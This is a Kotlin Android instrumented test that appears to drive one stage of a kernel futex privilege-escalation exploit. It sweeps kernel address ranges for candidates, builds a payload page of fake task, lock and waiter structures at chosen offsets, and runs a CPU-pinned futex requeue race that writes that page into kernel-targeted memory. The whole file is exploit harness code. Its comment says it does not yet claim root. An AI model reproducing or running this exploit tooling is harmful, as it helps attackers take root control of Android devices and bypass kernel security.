package com.ghostlock.app

import android.util.Log
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.ghostlock.app.engine.ktstep.DiscoverProcessor
import com.ghostlock.app.engine.ktstep.DiscoverProcessResult
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.NativeAttemptParams
import com.ghostlock.app.engine.ktstep.NativeAttemptResult
import com.ghostlock.app.engine.ktstep.NativeDiscover43499Port
import com.ghostlock.app.engine.ktstep.NativeDiscoverParams
import com.ghostlock.app.engine.ktstep.NativeDiscoverResult
import com.ghostlock.app.engine.ktstep.NativeJniAttemptPort
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteLayout
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.engine.ktstep.buildPayloadPage
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/** N3：discover 候选 + 页 bytes + actor，只做候选对拍，不声明 root。 */
@RunWith(AndroidJUnit4::class)
class N3CandidateInstrumentedTest {
    @Test
    fun aDiscoveredCandidateCarriesThePageIntoTheActorRun() {
        val syscalls = NativeKernelSyscalls()
        val wordsMap = syscalls.mmap(
            64L * 1024L,
            KernelFutexWords.PROT_READ or KernelFutexWords.PROT_WRITE,
            KernelFutexWords.MAP_PRIVATE or KernelFutexWords.MAP_ANONYMOUS,
            -1,
            0L,
        ) as SyscallResult.Ok
        val wordsBase = wordsMap.value
        val discover = NativeDiscover43499Port()
        assertEquals(SyscallResult.Ok(1L), discover.open())
        val discovered = discover.discover(
            NativeDiscoverParams(
                wordsAddress = wordsBase,
                wordsBytes = 64 * 1024,
                collisions = 8,
                threadCount = 4,
                possibleCpus = 8,
                pageSize = 4096,
                mmStructSize = 1024,
                mmSlabOrder = 2,
                headerBytes = 0x1000,
                totalPokes = 32768,
                wordBytes = 8,
                handleBytes = 8,
                wakeRounds = 64,
                roundTimeoutUs = 1000,
                rangeStart = 0xffffff8000000000uL.toLong(),
                rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000,
                sweepTags = false,
            ),
        )
        discover.close()
        assertTrue(discovered is NativeDiscoverResult.Ok)
        val answer = discovered as NativeDiscoverResult.Ok
        val decision = DiscoverProcessor(
            payloadOffset = 0xC000L,
            slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
        ).process(answer, wordsBase + 0xC000L)
        assertTrue(decision is DiscoverProcessResult.Ready)
        val addresses = (decision as DiscoverProcessResult.Ready).addresses

        val page = ByteArray(0x4000)
        val inputs = PayloadPageInputs(
            slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
            lock = LockFields(0, 8, 16, 24),
            waiter = WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
            task = TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
            values = PayloadValues(0x100, 120, 140),
            waiterWord = addresses.waiterWord,
            waiterTask = 0L,
            fakeTask = addresses.fakeTask,
            fakeLock = addresses.fakeLock,
            taskGroup = 0L,
            piTopTask = 0L,
            pointerBytes = 8,
        )
        val request = WriteRequest(addresses.waiterWord, WriteMode.Zero, true)
        val layout = WriteLayout(addresses.pageBase - 8L, 0x10000010001L, 0L, false)
        assertEquals(com.ghostlock.app.engine.ktstep.LayoutVerdict.Ok, buildPayloadPage(page, inputs, request, layout))

        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Ok -> made.words
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Errno -> error("words:" + made.code)
        }
        val attempt = NativeJniAttemptPort()
        assertEquals(SyscallResult.Ok(1L), attempt.open())
        val result = attempt.attempt(
            NativeAttemptParams(
                chainAddress = words.chain.address,
                waitAddress = words.wait.address,
                targetAddress = words.target.address,
                pageSinkAddress = wordsBase + 0xC000L,
                chainValue = 0,
                waitValue = 0,
                targetValue = 0,
                page = page,
                pointerBytes = 8,
                parkTimeoutNs = -1L,
                joinTimeoutMs = 3_000,
                settleUs = 500,
                waiterCpu = 0,
                ownerCpu = 1,
                requeueCpu = 2,
                waiterNice = 0,
                ownerNice = 0,
                requeueNice = 0,
                policy = 0,
            ),
        )
        attempt.close()
        words.close()
        syscalls.munmap(wordsBase, 64L * 1024L)

        Log.i(TAG, "discover=" + answer)
        Log.i(TAG, "candidate=" + addresses)
        Log.i(TAG, "n3-candidate=" + result)
        assertTrue(result is NativeAttemptResult.Ok)
        val final = result as NativeAttemptResult.Ok
        assertEquals(page.size, final.pageBytesWritten)
        assertTrue(final.actorsStarted)
    }

    private companion object {
        const val TAG = "N3Candidate"
    }
}
